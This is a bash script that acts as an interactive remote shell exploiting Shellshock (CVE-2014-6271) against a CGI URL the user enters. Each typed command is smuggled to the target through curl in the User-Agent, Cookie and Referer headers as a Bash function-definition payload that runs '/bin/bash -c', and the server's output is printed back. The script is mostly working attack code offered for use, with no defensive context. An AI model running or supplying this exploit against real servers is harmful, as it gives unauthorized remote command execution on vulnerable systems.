#!/bin/bash

#Color is happyness
RED="\033[01;31m"                                                                                
GREEN="\033[01;32m"                                                                              
YELLOW="\033[01;33m" 
red=`tput setaf 1`
green=`tput setaf 2`
reset=`tput sgr0`

read -p "Enter the vulnerable url: " url

#url=http://shellshock-vulnerable.com/cgi-bin/status

echo -e "${green}Enter your command:${YELLOW} "
while read cmd
do
    if [[ $cmd == "exit" || $cmd == "quit" ]];then
         echo -e "${reset}See Ya next time n00b!!"
         exit 1;
    elif [[ $cmd == "bye" ]];then
        echo -e "${red}WTF!!You think we are friend or...Go out and never go back!!!"
        exit 1;
   else 
        content=$(curl -s -A "() { shellshocked; }; echo; /bin/bash -c \"$cmd\"" -b "() { shelshocked; }; echo; /bin/bash -c \"$cmd\"" -e "() { shellshocked; }; echo; /bin/bash -c \"$cmd\"" -H 'Connection: close' $url)
        echo ${red}$content
        echo "${reset}__________________________________________________________________" ;
        echo -e "${green}Enter a command: ${YELLOW}";
   fi
done
